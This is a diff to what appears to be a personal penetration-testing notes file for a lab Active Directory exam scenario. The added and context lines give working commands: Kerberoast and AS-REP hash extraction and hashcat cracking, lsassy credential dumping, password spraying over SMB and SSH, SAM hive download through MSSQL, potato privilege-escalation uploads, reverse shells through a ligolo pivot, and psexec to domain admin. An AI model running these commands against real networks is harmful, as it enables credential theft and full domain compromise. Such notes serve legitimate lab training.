@@ -132,9 +132,10 @@ nxc smb <target ip> -u <admin user> -p <password> -M lsassy --local-auth
 ```bash
 # kerberoast check
 sudo impacket-GetUserSPNs -request -dc-ip <dc01 ip> -outputfile kerber.hash <domain>/<user>
+sudo hashcat -m 13100 kerber.hash rockyou.txt --force
 # as rep check
 sudo impacket-GetNPUsers -request -dc-ip <dc01 ip> -outputfile asrep.hash <domain>/<user>
-
+sudo hashcat -m 18200 asrep.hash rockyou.txt --force
 ```
 
 6) set up a ligolo agent on MS01. You could do a nmap scan of MS02 but it may take a while. In general, the smb port should be open so you can password spray with the domain users and all the passwords/Hashes you have obtained.
@@ -157,7 +158,7 @@ nxc ssh <MS02 IP> -u <domain user list> -p <password list> --continue-on-success
 nxc ssh <MS02 IP> -u <domain user list> -p <password list> --continue-on-success --local-auth
 ```
 
-7) Here is the part where it is slightly tricky. If you need to get a reverse shell back from MS02 to kali, you will need to open up a listener port on the ligolo agent on MS01. Refer to the ligolo page for more information. 
+7) Here is the part where it is slightly tricky. If you need to get a reverse shell back from MS02 to kali, you will need to open up a listener port on the ligolo agent on MS01. Refer to the ligolo page for more information. Remember that there could be firewall rules in effect on MS02 so choose ports like port 80, 443, 139, 445 that are open when choosing a port for your reverse shell.
 
 8) if you can get a shell either via winrm,rdp,ssh,mssql, you can then upload all your tooling. Do the same thing as with MS01 with the usual enumeration. If for some wierd reason, you have issues downloading from or uploading files to MS02, you can use nxc to download and upload files:
 
@@ -168,3 +169,7 @@ nxc mssql <MS02 IP> -u sql_svc -p 'pass' --get-file 'C:\\Windows\\System32\\SAM'
 
 nxc mssql <MS02 IP> -u sql_svc -p 'pass' --put-file SigmaPotato.exe 'C:\\Users\\Public\\potato.exe'
 ```
+
+9) Once again like with MS01, you need to priv esc and then repeat step 4. Identify any creds that belong to domain admin group if there are.
+
+10) if there are, great! you can use impacket-psexec to get in and get the flag. if not, you need to do password spraying again but this time with your new additional creds.
